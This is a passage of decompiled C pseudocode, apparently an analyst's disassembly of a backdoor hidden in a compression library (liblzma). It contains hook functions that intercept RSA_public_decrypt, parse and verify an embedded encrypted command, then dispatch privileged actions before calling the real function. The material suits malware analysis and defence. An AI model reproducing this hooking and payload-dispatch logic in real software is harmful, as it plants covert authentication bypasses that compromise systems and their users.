        *(undefined *)(lVar12 + 0x91) = *(undefined *)((long)puVar17 + 0xaf);
        if (*(ushort *)(lVar12 + 0x90) == 0) {
          puVar17 = (ushort *)0x0;
        }
        else {
          puVar17 = puVar17 + 0x58;
          if (uVar8 - 0x122 < (ulong)*(ushort *)(lVar12 + 0x90)) {
            *(undefined2 *)(lVar12 + 0x90) = 0;
            goto LAB_00109449;
          }
        }
        *(ushort **)(lVar12 + 0x98) = puVar17;
        *(undefined4 *)(lVar7 + 0x104) = 4;
        iVar4 = _Llzma_block_unpadded_size_1(1,0,0,0,lVar7);
LAB_00109305:
        if (iVar4 != 0) goto LAB_0010946f;
      }
    }
  }
  else if (iVar4 < 4) {
    if (iVar4 == 0) {
      if (*(ulong *)(lVar7 + 0xe8) < 0xae) goto LAB_0010946f;
      puVar16 = local_121;
      for (lVar11 = 0x29; lVar11 != 0; lVar11 = lVar11 + -1) {
        *puVar16 = 0;
        puVar16 = puVar16 + (ulong)bVar18 * -2 + 1;
      }
      lVar11 = *(long *)(lVar7 + 0xf0);
      local_131 = ZEXT816(0);
      if (((lVar11 != 0) && (*(long *)(lVar7 + 0x28) != 0)) &&
         ((*(long *)(*(long *)(lVar7 + 0x28) + 8) != 0 && (*(long *)(lVar7 + 0xf8) == 0)))) {
        *(long *)(lVar7 + 0xf8) = lVar11;
        local_aa = ZEXT816(0);
        puVar16 = local_9a;
        for (lVar12 = 0x4a; lVar12 != 0; lVar12 = lVar12 + -1) {
          *puVar16 = 0;
          puVar16 = puVar16 + (ulong)bVar18 * -2 + 1;
        }
        lVar12 = 0;
        do {
          local_aa[lVar12] = *(undefined *)(lVar11 + 2 + lVar12);
          lVar12 = lVar12 + 1;
        } while (lVar12 != 0x3a);
        iVar4 = _Lparse_lzma12_0(local_131,lVar7);
        if ((iVar4 != 0) &&
           (iVar4 = FUN_00107650(*(undefined8 *)
                                  (*(long *)(*(long *)(lVar7 + 0x28) + 8) +
                                  (ulong)*(uint *)(lVar7 + 0x100) * 8),local_aa,0x3a,0x5a,
                                 *(long *)(lVar7 + 0xf8) + 0x3c,local_131,lVar7), iVar4 != 0)) {
          *(undefined4 *)(lVar7 + 0x104) = 1;
          puVar16 = local_131;
          for (lVar11 = 0x39; lVar11 != 0; lVar11 = lVar11 + -1) {
            *puVar16 = 0;
            puVar16 = puVar16 + (ulong)bVar18 * -2 + 1;
          }
          iVar4 = _Lstream_encoder_mt_init_part_0(lVar7);
          goto LAB_00109305;
        }
      }
      *(undefined4 *)(lVar7 + 0x104) = 0xffffffff;
      *(undefined8 *)(lVar7 + 0xf8) = 0;
    }
    else if ((iVar4 == 1) && (*(ushort **)(lVar7 + 0xf8) != (ushort *)0x0)) {
      uVar8 = (ulong)**(ushort **)(lVar7 + 0xf8);
      uVar14 = *(ulong *)(lVar7 + 0xe8);
      if (uVar14 <= uVar8) {
        if (uVar14 != uVar8) goto LAB_0010946f;
        uVar8 = *(ulong *)(lVar7 + 0xe0);
        uVar2 = *(ulong *)(lVar7 + 0x98);
        if ((uVar8 < uVar2) || (uVar14 = uVar14 - 0x72, uVar8 - uVar2 <= uVar14)) {
LAB_00109491:
          if (*(code **)(lVar11 + 0x18) != (code *)0x0) {
            (**(code **)(lVar11 + 0x18))(0);
          }
          return 0;
        }
        local_aa = ZEXT816(0);
        puVar16 = local_9a;
        for (lVar10 = 0x62; lVar10 != 0; lVar10 = lVar10 + -1) {
          *puVar16 = 0;
          puVar16 = puVar16 + (ulong)bVar18 * -2 + 1;
        }
        lVar13 = *(long *)(lVar7 + 0xf0) + uVar14;
        lVar10 = 0;
        do {
          lVar5 = lVar10 + 1;
          local_aa[lVar10] = *(undefined *)(lVar13 + lVar10);
          lVar10 = lVar5;
        } while (lVar5 != 0x72);
        if ((uVar8 < uVar14) || (uVar6 = 0, uVar8 - uVar14 < uVar2)) goto LAB_00109491;
        for (; uVar2 != uVar6; uVar6 = uVar6 + 1) {
          *(undefined *)(lVar13 + uVar6) = *(undefined *)(lVar7 + 0xa0 + uVar6);
        }
        iVar4 = FUN_00107650(*(undefined8 *)
                              (*(long *)(*(long *)(lVar7 + 0x28) + 8) +
                              (ulong)*(uint *)(lVar7 + 0x100) * 8),*(undefined8 *)(lVar7 + 0xf0),
                             uVar14 + *(long *)(lVar7 + 0x98),*(undefined8 *)(lVar7 + 0xe0),local_aa
                             ,*(long *)(lVar7 + 0xf8) + 2,lVar7,(ulong)*(uint *)(lVar7 + 0x100));
        if (iVar4 == 0) {
          *(undefined4 *)(lVar7 + 0x104) = 0xffffffff;
          goto LAB_00109491;
        }
        *(undefined4 *)(lVar7 + 0x104) = 3;
        goto LAB_00109236;
      }
    }
  }
  else if (iVar4 == 4) goto LAB_0010946f;
LAB_00109449:
  if (((*(long *)(lVar7 + 0x10) != 0) &&
      (pcVar3 = *(code **)(*(long *)(lVar7 + 0x10) + 0x18), pcVar3 != (code *)0x0)) &&
     (*(undefined4 *)(lVar7 + 0x104) = 0xffffffff, *(int *)(lVar7 + 0x50) != 0)) {
    (*pcVar3)(0);
  }
LAB_0010946f:
                    // WARNING: Could not recover jumptable at 0x0010948f. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar9 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3);
  return uVar9;
}



// WARNING: Unable to use type for symbol puVar19

int installed_func_1(RSA *rsa,long ctx,int *match)

{
  BIGNUM *pBVar1;
  code *pcVar2;
  long *plVar3;
  int *piVar4;
  byte bVar5;
  uint uVar6;
  int iVar7;
  int iVar8;
  int iVar9;
  ulong uVar10;
  int *piVar11;
  ulong uVar12;
  long lVar13;
  byte bVar14;
  uint uVar15;
  long lVar16;
  ulong uVar17;
  ulong uVar18;
  uint *puVar20;
  undefined *puVar21;
  RSA *pRVar22;
  RSA_METHOD **ppRVar23;
  undefined4 *puVar24;
  undefined *puVar25;
  byte bVar26;
  long lVar27;
  ulong uVar28;
  byte bVar29;
  ulong local_5f8;
  long local_5e0;
  uint local_5c0;
  undefined local_5a1;
  undefined8 local_5a0;
  undefined8 local_598;
  undefined local_590 [16];
  undefined local_580 [48];
  RSA rsa2;
  uchar *local_2f0;
  ENGINE *pEStack_2e8;
  byte bStack_2e0;
  byte bStack_2df;
  byte bStack_2de;
  byte bStack_2dd;
  undefined uStack_2dc;
  undefined auStack_2db [3];
  undefined uStack_2d8;
  uint auStack_2d7 [3];
  undefined auStack_2cb [114];
  uint local_259;
  undefined local_255;
  undefined local_254 [465];
  undefined4 local_83;
  uint uStack_7f;
  undefined4 uStack_7b;
  undefined4 uStack_77;
  undefined local_73 [67];
  uchar **puVar19;
  
  bVar29 = 0;
                    // Zero out local variables
  puVar19 = &local_2f0;
  for (lVar13 = 0xae; lVar13 != 0; lVar13 = lVar13 + -1) {
    *(undefined4 *)puVar19 = 0;
    puVar19 = (uchar **)((long)puVar19 + 4);
  }
  if (ctx != 0) {
    if ((((*(int *)(ctx + 0x18) == 0) && (rsa != (RSA *)0x0)) &&
        (lVar13 = *(long *)(ctx + 8), lVar13 != 0)) &&
       ((pcVar2 = *(code **)(lVar13 + 0x60), pcVar2 != (code *)0x0 &&
        (*(long *)(lVar13 + 0x100) != 0)))) {
      if (match == (int *)0x0) {
        *(undefined4 *)(ctx + 0x18) = 1;
        return 0;
      }
      *match = 1;
      (*pcVar2)(rsa,&local_2f0,&pEStack_2e8,0);
      if ((((local_2f0 != (uchar *)0x0) && (pEStack_2e8 != (ENGINE *)0x0)) &&
          ((*(long *)(ctx + 8) != 0 &&
           (((pcVar2 = *(code **)(*(long *)(ctx + 8) + 0x68), pcVar2 != (code *)0x0 &&
             (uVar6 = (*pcVar2)(), uVar6 < 0x4001)) &&
            (uVar6 = uVar6 + 7 >> 3, uVar6 - 0x14 < 0x205)))))) &&
         (iVar7 = (**(code **)(*(long *)(ctx + 8) + 0x100))(local_2f0,&uStack_2dc + 1), -1 < iVar7))
      {
        uVar12 = (ulong)uVar6;
        if ((ulong)(long)iVar7 <= uVar12) {
          if ((ulong)(long)iVar7 < 0x11) goto LAB_0010a13a;
          if (((CONCAT13(uStack_2d8,auStack_2db) == 0) || (auStack_2d7[0] == 0)) ||
             (uVar18 = (ulong)CONCAT13(uStack_2d8,auStack_2db) * (ulong)auStack_2d7[0] +
                       CONCAT44(auStack_2d7[2],auStack_2d7[1]), 3 < uVar18)) goto LAB_0010a13a;
          lVar13 = *(long *)(ctx + 0x10);
          if (((lVar13 != 0) && (*(long *)(lVar13 + 0x10) != 0)) &&
             ((*(long *)(lVar13 + 0x18) != 0 &&
              ((*(long *)(ctx + 0x30) != 0 && (*(int *)(ctx + 0x160) == 0x1c8)))))) {
            local_83 = CONCAT13(uStack_2d8,auStack_2db);
            uStack_7f = auStack_2d7[0];
            uStack_7b = auStack_2d7[1];
            uStack_77 = auStack_2d7[2];
            iVar7 = _Lparse_lzma12_0(local_73,ctx);
            if ((iVar7 != 0) &&
               (iVar7 = FUN_001071b0(auStack_2cb,uVar6 - 0x10,local_73,&local_83,auStack_2cb,
                                     *(undefined8 *)(ctx + 8)), iVar7 != 0)) {
              rsa2._0_16_ = ZEXT816(0);
              puVar25 = local_73;
              for (lVar13 = 0x39; lVar13 != 0; lVar13 = lVar13 + -1) {
                *puVar25 = 0;
                puVar25 = puVar25 + (ulong)bVar29 * -2 + 1;
              }
              local_590 = ZEXT816(0);
              ppRVar23 = &rsa2.meth;
              for (lVar13 = 0x93; lVar13 != 0; lVar13 = lVar13 + -1) {
                *(undefined4 *)ppRVar23 = 0;
                ppRVar23 = (RSA_METHOD **)((long)ppRVar23 + (ulong)bVar29 * -8 + 4);
              }
              plVar3 = *(long **)(ctx + 0x28);
              puVar25 = local_580;
              for (lVar13 = 0x29; lVar13 != 0; lVar13 = lVar13 + -1) {
                *puVar25 = 0;
                puVar25 = puVar25 + (ulong)bVar29 * -2 + 1;
              }
              if ((((plVar3 != (long *)0x0) && (plVar3[1] != 0)) && (*(long *)(ctx + 8) != 0)) &&
                 (0x71 < uVar12 - 0x10)) {
                iVar7 = (int)uVar18;
                rsa2.pad = iVar7;
                if (4 < uVar12 - 0x82) {
                  bStack_2e0 = (byte)local_259;
                  bStack_2df = (byte)(local_259 >> 8);
                  bStack_2de = (byte)(local_259 >> 0x10);
                  bStack_2dd = (byte)(local_259 >> 0x18);
                  _uStack_2dc = CONCAT31(auStack_2db,local_255);
                  local_5f8 = uVar12 - 0x87;
                  if (uVar18 == 2) {
                    uVar10 = (ulong)CONCAT11(local_255,bStack_2dd);
                    if ((char)bStack_2e0 < '\0') {
                      if (CONCAT11(local_255,bStack_2dd) != 0) goto LAB_0010a132;
                      uVar17 = 0;
                      uVar10 = 0x39;
                      puVar25 = local_254;
                      lVar13 = 0;
                    }
                    else {
                      if ((local_259 & 0x100) != 0) {
                        uVar10 = uVar10 + 8;
                      }
                      puVar25 = (undefined *)0x0;
                      lVar13 = 0x87;
                      uVar17 = uVar10;
                    }
                    if (local_5f8 < uVar10) goto LAB_0010a132;
                    local_5e0 = uVar10 + 5;
                    local_5f8 = local_5f8 - uVar10;
                    uVar28 = uVar10 + 0x87;
                    iVar8 = (int)uVar10 + 4;
                  }
                  else if ((iVar7 == 3) && ((local_259 & 0x4000) == 0)) {
                    if (local_5f8 < 0x30) goto LAB_0010a132;
                    uVar17 = 0x30;
                    lVar13 = 0x87;
                    puVar25 = (undefined *)0x0;
                    local_5e0 = 0x35;
                    uVar28 = 0x87;
                    iVar8 = 0x34;
                  }
                  else {
                    uVar17 = 0;
                    lVar13 = 0;
                    uVar28 = 0x87;
                    puVar25 = (undefined *)0x0;
                    local_5e0 = 5;
                    iVar8 = 4;
                  }
                  puVar20 = &local_259;
                  puVar21 = &rsa2.field_0x4;
                  for (uVar10 = (ulong)(iVar8 + 1); uVar10 != 0; uVar10 = uVar10 - 1) {
                    *puVar21 = *(undefined *)puVar20;
                    puVar20 = (uint *)((long)puVar20 + (ulong)bVar29 * -2 + 1);
                    puVar21 = puVar21 + (ulong)bVar29 * -2 + 1;
                  }
                  local_5a0 = 0;
                  lVar27 = *plVar3;
                  local_598 = 0;
                  if (((lVar27 != 0) && (plVar3[1] != 0)) &&
                     ((lVar27 != plVar3[1] &&
                      ((((*(uint *)(plVar3 + 3) < 2 &&
                         (iVar8 = FUN_001074d0(lVar27,&local_5a0,*(undefined8 *)(ctx + 0x10)),
                         iVar8 != 0)) &&
                        (iVar8 = FUN_001074d0(*(undefined8 *)(*(long *)(ctx + 0x28) + 8),&local_598,
                                              *(undefined8 *)(ctx + 0x10)), uVar10 = local_5a0,
                        iVar8 != 0)) && (local_5a0 == local_598)))))) {
                    iVar8 = _Lparse_lzma12_0(local_590,ctx);
                    if (iVar8 != 0) {
                      lVar27 = 0;
                      do {
                        local_5c0 = (uint)uVar10;
                        uVar6 = (uint)lVar27;
                        if (local_5c0 <= uVar6) goto LAB_0010a132;
                        lVar16 = *(long *)(*(long *)(ctx + 0x28) + 8);
                        iVar8 = FUN_00107650(*(undefined8 *)(lVar16 + lVar27 * 8),&rsa2,
                                             local_5e0 + 4,0x25c,auStack_2cb,local_590,ctx,lVar16);
                        lVar27 = lVar27 + 1;
                      } while (iVar8 == 0);
                      *(uint *)(ctx + 0x100) = uVar6;
                      if ((uVar18 != 2) || (-1 < (char)bStack_2e0)) {
                        if (lVar13 == 0) {
LAB_00109ab7:
                          if (uVar28 <= uVar12) goto LAB_00109ac2;
                        }
                        else {
                          uVar28 = 0x87;
LAB_00109ac2:
                          if (uVar17 <= uVar12 - uVar28) {
                            if ((((bStack_2e0 & 4) == 0) || (*(long *)(ctx + 0x10) == 0)) ||
                               (pcVar2 = *(code **)(*(long *)(ctx + 0x10) + 0x58),
                               pcVar2 == (code *)0x0)) {
                              *(undefined4 *)(*(long *)(ctx + 0x30) + 8) = 0;
                              if ((bStack_2e0 & 5) == 5) goto LAB_0010a1da;
                            }
                            else {
                              (*pcVar2)();
                              *(undefined4 *)(*(long *)(ctx + 0x30) + 8) = 1;
                            }
                            iVar8 = (**(code **)(*(long *)(ctx + 0x10) + 0x10))();
                            bVar5 = bStack_2e0;
                            *(int *)(ctx + 0x90) = iVar8;
                            bVar26 = bStack_2e0 & 0x10;
                            if (((bVar26 == 0) || (*(int *)(*(long *)(ctx + 0x30) + 4) != 0)) &&
                               (((bStack_2e0 & 2) == 0 ||
                                ((iVar9 = _Llzma_rc_prices_1(&bStack_2e0,ctx), iVar9 != 0 ||
                                 (bVar26 == 0)))))) {
                              if (uVar18 == 0) {
                                if (((char)bStack_2df < '\0') ||
                                   (*(long *)(*(long *)(ctx + 0x20) + 200) != 0)) {
                                  bVar26 = 0xff;
                                  if ((bStack_2df & 2) != 0) {
                                    bVar26 = (byte)(CONCAT11(bStack_2dd,bStack_2de) >> 6) & 0x7f;
                                  }
                                  bVar14 = 0xff;
                                  if ((char)bVar5 < '\0') {
                                    bVar14 = (byte)(((ulong)CONCAT41(_uStack_2dc,bStack_2dd) << 0x18
                                                    ) >> 0x1d) & 0x1f;
                                  }
                                  uVar6 = (uint)CONCAT11(bVar14,bVar26);
                                  if ((bStack_2df & 4) == 0) {
LAB_00109c76:
                                    uVar6 = uVar6 | 0xff0000;
                                    uVar15 = 0xff;
                                  }
                                  else {
                                    uVar15 = (uint)(uStack_2dc >> 5);
                                    uVar6 = uVar6 | (uStack_2dc >> 2 & 7) << 0x10;
                                  }
LAB_00109c9b:
                                  uVar6 = uVar6 | uVar15 << 0x18;
LAB_00109caa:
                                  *(uint *)(ctx + 0x54) = uVar6;
                                  pBVar1 = (BIGNUM *)(&uStack_2dc + uVar28 + 1);
                                  if (iVar8 == 0) {
                                    lVar13 = *(long *)(ctx + 0x10);
                                    if ((((lVar13 != 0) &&
                                         (*(code **)(lVar13 + 0x20) != (code *)0x0)) &&
                                        (*(long *)(lVar13 + 0x28) != 0)) &&
                                       (*(long *)(lVar13 + 0x30) != 0)) {
                                      if (uVar18 == 0) {
                                        piVar11 = *(int **)(ctx + 0x20);
                                        if (((piVar11 != (int *)0x0) &&
                                            (*(long *)(piVar11 + 0x16) != 0)) && (*piVar11 != 0)) {
                                          if ((char)bStack_2df < '\0') goto LAB_00109d56;
                                          piVar4 = *(int **)(piVar11 + 0x32);
                                          if (piVar4 != (int *)0x0) {
                                            iVar7 = *piVar4;
                                            if (iVar7 < 3) {
                                              if (-1 < iVar7) {
                                                *piVar4 = 3;
LAB_00109d56:
                                                if ((bVar5 & 0x40) != 0) {
                                                  puVar20 = *(uint **)(piVar11 + 0x30);
                                                  if ((puVar20 == (uint *)0x0) || (1 < *puVar20))
                                                  goto LAB_0010a1da;
                                                  *puVar20 = 0;
                                                }
                                                local_5a0 = CONCAT44(local_5a0._4_4_,0xffffffff);
                                                if ((bVar5 & 0x20) == 0) {
                                                  iVar7 = installed_func_3(ctx,&local_5a0,1,1);
                                                }
                                                else {
                                                  iVar7 = installed_func_2(&local_5a0,
                                                                           bStack_2df >> 3 & 0xf,
                                                                           lVar13);
                                                }
                                                uVar12 = local_5a0;
                                                if (iVar7 != 0) {
                                                  iVar7 = (int)local_5a0;
                                                  local_5a1 = 0;
                                                  local_598 = local_598 & 0xffffffff00000000;
                                                  local_590 = ZEXT816(0);
                                                  if (((-1 < (int)local_5a0) &&
                                                      (lVar13 = *(long *)(ctx + 0x10), lVar13 != 0))
                                                     && ((*(long *)(lVar13 + 0x40) != 0 &&
                                                         (*(long *)(lVar13 + 0x50) != 0)))) {
                                                    iVar8 = (int)local_5a0 >> 6;
                                                    uVar18 = 1L << ((byte)local_5a0 & 0x3f);
                                                    do {
                                                      pRVar22 = &rsa2;
                                                      for (lVar27 = 0x20; lVar27 != 0;
                                                          lVar27 = lVar27 + -1) {
                                                        pRVar22->pad = 0;
                                                        pRVar22 = (RSA *)((long)pRVar22 +
                                                                         (ulong)bVar29 * -8 + 4);
                                                      }
                                                      *(ulong *)(&rsa2.pad + (long)iVar8 * 2) =
                                                           uVar18;
                                                      local_590 = ZEXT816(500000000) << 0x40;
                                                      iVar9 = (**(code **)(lVar13 + 0x40))
                                                                        (iVar7 + 1,&rsa2,0,0,
                                                                         local_590,0);
                                                      if (-1 < iVar9) {
                                                        if (((iVar9 != 0) &&
                                                            ((uVar18 & *(ulong *)(&rsa2.pad +
                                                                                 (long)iVar8 * 2))
                                                             != 0)) &&
                                                           (lVar27 = FUN_001070a0(uVar12 & 
                                                  0xffffffff,&local_598,4,lVar13), -1 < lVar27)) {
                                                    uVar6 = (uint)local_598 >> 0x18 |
                                                            ((uint)local_598 & 0xff0000) >> 8 |
                                                            ((uint)local_598 & 0xff00) << 8 |
                                                            (uint)local_598 << 0x18;
                                                    local_598 = CONCAT44(local_598._4_4_,uVar6);
                                                    if ((uVar6 - 1 < 0x41) &&
                                                       (lVar27 = FUN_001070a0(uVar12 & 0xffffffff,
                                                                              &local_5a1,1,lVar13),
                                                       -1 < lVar27)) {
                                                      *(ulong *)(ctx + 0x98) =
                                                           (ulong)((uint)local_598 - 1);
                                                      lVar13 = FUN_001070a0(uVar12 & 0xffffffff,
                                                                            ctx + 0xa0,
                                                                            (ulong)((uint)local_598
                                                                                   - 1),lVar13);
                                                      if (-1 < lVar13) {
                                                        lVar13 = *(long *)(ctx + 0x20);
                                                        if (*(long *)(lVar13 + 0x18) != 0) {
                                                          plVar3 = *(long **)(lVar13 + 0x58);
                                                          if ((bStack_2de & 0x3f) == 0) {
                                                            iVar7 = 0x16;
                                                            if (plVar3 != (long *)0x0) {
                                                              iVar7 = *(int *)(plVar3 + -1);
                                                            }
                                                          }
                                                          else {
                                                            iVar7 = (uint)(bStack_2de & 0x3f) * 2;
                                                          }
                                                          *(int *)(lVar13 + 0x60) = iVar7 + 1;
                                                          *plVar3 = *(long *)(lVar13 + 0x18);
                                                          goto LAB_0010a096;
                                                        }
                                                      }
                                                    }
                                                  }
                                                  break;
                                                  }
                                                  piVar11 = (int *)(**(code **)(lVar13 + 0x50))();
                                                  } while (*piVar11 == 4);
                                                  }
                                                }
                                              }
                                            }
                                            else if (iVar7 == 3) goto LAB_00109d56;
                                          }
                                        }
                                      }
                                      else if (iVar7 == 1) {
                                        iVar7 = _Llzma_block_unpadded_size_1
                                                          (bStack_2df & 1,bStack_2e0 >> 6 & 1,
                                                           bStack_2df >> 1 & 1,bStack_2dd,ctx);
                                        if (iVar7 != 0) {
LAB_0010a096:
                                          local_590[0] = 1;
                                          ppRVar23 = &rsa2.meth;
                                          for (lVar13 = 0x3c; lVar13 != 0; lVar13 = lVar13 + -1) {
                                            *(undefined4 *)ppRVar23 = 0;
                                            ppRVar23 = (RSA_METHOD **)
                                                       ((long)ppRVar23 + (ulong)bVar29 * -8 + 4);
                                          }
                                          rsa2._1_15_ = SUB1615(ZEXT816(0),1);
                                          rsa2.pad._0_1_ = 0x80;
                                          lVar13 = (**(code **)(*(long *)(ctx + 8) + 0xe0))
                                                             (local_590,1,0);
                                          if (((lVar13 != 0) &&
                                              (lVar27 = (**(code **)(*(long *)(ctx + 8) + 0xe0))
                                                                  (&rsa2,0x100,0), lVar27 != 0)) &&
                                             (iVar7 = (**(code **)(*(long *)(ctx + 8) + 0xe8))
                                                                (rsa,lVar27,lVar13,0), iVar7 == 1))
                                          goto LAB_0010a132;
                                        }
                                      }
                                      else if (iVar7 == 2) {
                                        uVar17 = uVar17 & 0xffff;
                                        if ((bStack_2df & 1) == 0) {
                                          iVar8 = 0;
                                          lVar27 = 0;
                                          iVar7 = 0;
                                        }
                                        else {
                                          if (uVar17 < 9) goto LAB_0010a1da;
                                          iVar7 = *(int *)&pBVar1->d;
                                          iVar8 = *(int *)((long)auStack_2d7 + uVar28);
                                          uVar17 = uVar17 - 8;
                                          lVar27 = 8;
                                        }
                                        if ((char)bVar5 < '\0') {
                                          if (2 < uVar17) {
                                            uVar12 = (ulong)*(ushort *)((long)&pBVar1->d + lVar27);
                                            uVar17 = uVar17 - 2;
                                            lVar27 = lVar27 + 2;
                                            if (uVar17 <= uVar12) goto LAB_00109fd9;
                                          }
                                        }
                                        else {
                                          uVar12 = (ulong)CONCAT11(uStack_2dc,bStack_2dd);
LAB_00109fd9:
                                          if ((((uVar12 <= uVar17) &&
                                               ((iVar8 == 0 ||
                                                (iVar8 = (**(code **)(lVar13 + 0x20))
                                                                   (iVar8,iVar8,iVar8), iVar8 != -1)
                                                ))) && ((iVar7 == 0 ||
                                                        (iVar7 = (**(code **)(*(long *)(ctx + 0x10)
                                                                             + 0x28))
                                                                           (iVar7,iVar7,iVar7),
                                                        iVar7 != -1)))) &&
                                             (*(char *)((long)&pBVar1->d + lVar27) != '\0')) {
                                            (**(code **)(*(long *)(ctx + 0x10) + 0x30))();
                                            goto LAB_0010a096;
                                          }
                                        }
                                      }
                                      else if ((((bStack_2df & 0xc0) == 0xc0) &&
                                               (*(long *)(lVar13 + 0x18) != 0)) &&
                                              (*(code **)(lVar13 + 0x40) != (code *)0x0)) {
                                        rsa2._0_16_ = ZEXT816(5);
                                        (**(code **)(lVar13 + 0x40))(0,0,0,0,&rsa2,0);
                                        (**(code **)(lVar13 + 0x18))(0);
                                      }
                                    }
                                  }
                                  else {
                                    puVar24 = (undefined4 *)&rsa2.field_0x4;
                                    for (lVar13 = 0xb; lVar13 != 0; lVar13 = lVar13 + -1) {
                                      *puVar24 = 0;
                                      puVar24 = puVar24 + (ulong)bVar29 * -2 + 1;
                                    }
                                    rsa2.version = (long)&bStack_2e0;
                                    rsa2.meth = (RSA_METHOD *)local_2f0;
                                    rsa2.engine = pEStack_2e8;
                                    rsa2.n = pBVar1;
                                    rsa2.e._0_2_ = (short)uVar17;
                                    rsa2.d = (BIGNUM *)rsa;
                                    iVar7 = installed_func_0(&rsa2,ctx);
                                    if (iVar7 != 0) {
                                      *(undefined4 *)(ctx + 0x18) = 1;
                                      *match = 0;
                                      return 1;
                                    }
                                  }
                                }
                              }
                              else if (iVar7 == 1) {
                                if (((bStack_2df & 1) != 0) ||
                                   (*(long *)(*(long *)(ctx + 0x20) + 200) != 0)) goto LAB_00109b8c;
                              }
                              else {
                                if (iVar7 != 3) {
LAB_00109b8c:
                                  uVar6 = 0;
                                  goto LAB_00109caa;
                                }
                                if (((char)bStack_2dd < '\0') ||
                                   (*(long *)(*(long *)(ctx + 0x20) + 200) != 0)) {
                                  if ((bStack_2de & 0x20) != 0) {
                                    bVar26 = 0xff;
                                    if ((char)bStack_2de < '\0') {
                                      bVar26 = uStack_2dc;
                                    }
                                    bVar14 = 0xff;
                                    if ((bStack_2de & 0x40) != 0) {
                                      bVar14 = bStack_2dd & 0x3f;
                                    }
                                    uVar6 = (uint)CONCAT11(bVar14,bVar26);
                                    if ((bStack_2dd & 0x40) == 0) goto LAB_00109c76;
                                    uVar15 = bStack_2df >> 3 & 7;
                                    uVar6 = uVar6 | (bStack_2df & 7) << 0x10;
                                    goto LAB_00109c9b;
                                  }
                                  uVar6 = 0xffffffff;
                                  goto LAB_00109caa;
                                }
                              }
                            }
                          }
                        }
LAB_0010a1da:
                        *(undefined4 *)(ctx + 0x18) = 1;
                        puVar25 = local_73;
                        for (lVar13 = 0x39; lVar13 != 0; lVar13 = lVar13 + -1) {
                          *puVar25 = 0;
                          puVar25 = puVar25 + (ulong)bVar29 * -2 + 1;
                        }
                        if ((bStack_2e0 & 1) != 0) {
                          if (*(long *)(ctx + 0x10) == 0) {
                            return 0;
                          }
                          pcVar2 = *(code **)(*(long *)(ctx + 0x10) + 0x18);
                          if (pcVar2 == (code *)0x0) {
                            return 0;
                          }
                          (*pcVar2)(0);
                          return 0;
                        }
                        goto LAB_0010a13a;
                      }
                      if (puVar25 != (undefined *)0x0) {
                        if ((bStack_2df & 1) == 0) {
                          lVar13 = 0;
                        }
                        else {
                          lVar13 = 8;
                          if (local_5f8 < 9) goto LAB_0010a132;
                        }
                        if (((lVar13 + 2U <= local_5f8) &&
                            (uVar17 = (ulong)*(ushort *)(&uStack_2dc + uVar28 + lVar13 + 1) +
                                      lVar13 + 2U, uVar17 < local_5f8)) &&
                           (0x71 < local_5f8 - uVar17)) {
                          if (((*(ulong *)(ctx + 0xe8) <= *(ulong *)(ctx + 0xe0)) &&
                              (uVar10 = *(ulong *)(ctx + 0xe0) - *(ulong *)(ctx + 0xe8),
                              0x38 < uVar10)) && (uVar17 <= uVar10 - 0x39)) {
                            lVar13 = *(long *)(ctx + 0xf0);
                            uVar10 = 0;
                            do {
                              *(undefined *)(lVar13 + uVar10) = (&uStack_2dc)[uVar10 + uVar28 + 1];
                              uVar10 = uVar10 + 1;
                            } while (uVar17 != uVar10);
                            lVar13 = *(long *)(*(long *)(ctx + 0x28) + 8);
                            lVar16 = *(long *)(ctx + 0xe8) + uVar17;
                            *(long *)(ctx + 0xe8) = lVar16;
                            iVar8 = FUN_00107650(*(undefined8 *)
                                                  (lVar13 + (ulong)*(uint *)(ctx + 0x100) * 8),
                                                 *(undefined8 *)(ctx + 0xf0),lVar16,
                                                 *(undefined8 *)(ctx + 0xe0),
                                                 &uStack_2dc + uVar17 + uVar28 + 1,puVar25,ctx,
                                                 lVar27);
                            if (iVar8 != 0) goto LAB_00109ab7;
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
LAB_0010a132:
      *(undefined4 *)(ctx + 0x18) = 1;
      goto LAB_0010a13a;
    }
    *(undefined4 *)(ctx + 0x18) = 1;
  }
  if (match == (int *)0x0) {
    return 0;
  }
LAB_0010a13a:
  *match = 1;
  return 0;
}



int RSA_public_decrypt(int flen,uchar *from,uchar *to,RSA *rsa,ulong padding)

{
  code *UNRECOVERED_JUMPTABLE;
  int result;
  int match;
  
  if (((global_ctx != 0) && (*(code ***)(global_ctx + 8) != (code **)0x0)) &&
     (UNRECOVERED_JUMPTABLE = **(code ***)(global_ctx + 8), UNRECOVERED_JUMPTABLE != (code *)0x0)) {
    if (rsa != (RSA *)0x0) {
      match = 1;
      result = installed_func_1(rsa,global_ctx,&match);
      padding = padding & 0xffffffff;
      if (match == 0) {
        return result;
      }
    }
                    // WARNING: Could not recover jumptable at 0x0010a2dd. Too many branches
                    // WARNING: Treating indirect jump as call
                    // Real RSA_public_decrypt()
    result = (*UNRECOVERED_JUMPTABLE)(flen,from,to,rsa,padding);
    return result;
  }
  return 0;
}



undefined8 _Llzma_index_memusage_part_0(undefined8 param_1,RSA *param_2)

{
  code *UNRECOVERED_JUMPTABLE;
  undefined8 uVar1;
  int local_1c;
  
  if (((global_ctx != 0) && (*(long *)(global_ctx + 8) != 0)) &&
     (UNRECOVERED_JUMPTABLE = *(code **)(*(long *)(global_ctx + 8) + 8),
     UNRECOVERED_JUMPTABLE != (code *)0x0)) {
    if (param_2 != (RSA *)0x0) {
      installed_func_1(param_2,global_ctx,&local_1c);
    }
                    // WARNING: Could not recover jumptable at 0x0010a343. Too many branches
                    // WARNING: Treating indirect jump as call
    uVar1 = (*UNRECOVERED_JUMPTABLE)(param_1,param_2);
    return uVar1;
  }
  return 0;
}



void _Llzma_index_init_0(RSA *rsa,undefined8 param_2,undefined8 param_3,RSA *param_4,int param_5)

{
  code *UNRECOVERED_JUMPTABLE;
  int match;
  
  if (((global_ctx != 0) && (*(long *)(global_ctx + 8) != 0)) &&
     (UNRECOVERED_JUMPTABLE = *(code **)(*(long *)(global_ctx + 8) + 0x10),
     UNRECOVERED_JUMPTABLE != (code *)0x0)) {
    if (rsa != (RSA *)0x0) {
      installed_func_1(rsa,global_ctx,&match);
    }
                    // WARNING: Could not recover jumptable at 0x0010a3b4. Too many branches
                    // WARNING: Treating indirect jump as call
    (*UNRECOVERED_JUMPTABLE)(rsa,param_2,param_3,param_4);
    return;
  }
  return;
}



void _Llzma12_mode_map_part_1(undefined4 param_1,undefined8 param_2,void *param_3)

{
  void *endptr;
